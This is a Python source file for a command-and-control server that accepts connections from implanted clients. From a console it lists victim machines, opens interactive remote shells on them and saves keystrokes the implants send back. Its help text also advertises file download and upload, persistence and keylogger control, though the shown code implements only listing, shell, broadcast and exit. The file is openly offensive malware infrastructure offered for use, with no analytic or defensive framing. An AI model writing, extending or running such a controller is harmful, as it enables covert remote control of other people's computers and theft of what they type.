import socket
import threading
import time
import sys
import os

HOST = '0.0.0.0'
PORT = 6767
clients = {}
clients_lock = threading.Lock()

def broadcast(message, exclude=None):
    with clients_lock:
        for client_id, data in list(clients.items()):
            if exclude and client_id == exclude:
                continue
            try:
                data['socket'].send(message.encode())
            except:
                pass

def handle_client(client_socket, address):
    client_id = f"{address[0]}:{address[1]}"
    client_info = {'socket': client_socket, 'ip': address[0], 'port': address[1], 'hostname': 'Unknown', 'connected': time.time()}
    
    with clients_lock:
        clients[client_id] = client_info
    
    try:
        client_socket.send(b"INFO_REQUEST")
        hostname = client_socket.recv(1024).decode().strip()
        client_info['hostname'] = hostname
        print(f"[+] {client_id} - {hostname} connected.")
        broadcast(f"[+] {hostname} ({address[0]}) joined.\n", exclude=client_id)
        
        client_socket.send(b"HELP: Commands: help, list, shell, exit, broadcast, download, upload, persist, keylog")
        
        while True:
            try:
                client_socket.settimeout(1)
                data = client_socket.recv(1024).decode('utf-8', errors='ignore')
                if not data:
                    break
                if data.startswith("OUTPUT:"):
                    print(f"{hostname}: {data[7:]}")
                elif data.startswith("KEYLOG:"):
                    with open(f"keylog_{hostname}.txt", "a") as f:
                        f.write(data[7:])
            except socket.timeout:
                continue
            except:
                break
    except Exception as e:
        print(f"[!] Error with {client_id}: {e}")
    finally:
        with clients_lock:
            del clients[client_id]
        print(f"[-] {client_id} - {hostname} disconnected.")
        broadcast(f"[-] {hostname} ({address[0]}) left.\n")
        client_socket.close()

def server_loop():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[*] Advanced C2 Server listening on {HOST}:{PORT}")
    while True:
        client_socket, address = server.accept()
        client_thread = threading.Thread(target=handle_client, args=(client_socket, address))
        client_thread.daemon = True
        client_thread.start()

def controller_loop():
    print("C2 Controller ready. Type 'help' for commands.")
    while True:
        try:
            cmd = input("\nC2> ").strip().lower()
            if cmd == "help":
                print("""
list               - Show all connected clients
shell <id>         - Open interactive shell with client
broadcast <msg>    - Send message to all clients
download <id> <file> - Download file from client
upload <id> <file>   - Upload file to client
persist <id>       - Install persistence on client
keylog <id> <start/stop> - Start/stop keylogger
exit               - Shutdown server
                """)
            elif cmd == "list":
                with clients_lock:
                    if not clients:
                        print("[!] No clients connected.")
                    for cid, info in clients.items():
                        print(f"[{cid}] {info['hostname']} - {info['ip']} - Up: {int(time.time() - info['connected'])}s")
            elif cmd.startswith("shell "):
                parts = cmd.split()
                if len(parts) < 2: continue
                cid = parts[1]
                with clients_lock:
                    if cid not in clients:
                        print("[!] Client not found.")
                        continue
                    sock = clients[cid]['socket']
                print(f"[*] Opening shell to {cid}. Type 'exit' to leave shell.")
                while True:
                    shell_cmd = input(f"Shell[{cid}]> ")
                    if shell_cmd.strip() == "exit":
                        break
                    try:
                        sock.send(f"CMD:{shell_cmd}".encode())
                        output = sock.recv(8192).decode('utf-8', errors='ignore')
                        if output.startswith("OUTPUT:"):
                            output = output[7:]
                        print(output)
                    except:
                        print("[!] Shell broken.")
                        break
            elif cmd.startswith("broadcast "):
                message = cmd[10:]
                broadcast(f"BROADCAST:{message}")
                print(f"[*] Broadcast sent.")
            elif cmd == "exit":
                print("[*] Shutting down.")
                os._exit(0)
            else:
                print("[!] Unknown command. Type 'help'.")
        except KeyboardInterrupt:
            print("\n[*] Shutting down.")
            os._exit(0)
        except Exception as e:
            print(f"[!] Error: {e}")

if __name__ == "__main__":
    threading.Thread(target=server_loop, daemon=True).start()
    controller_loop()
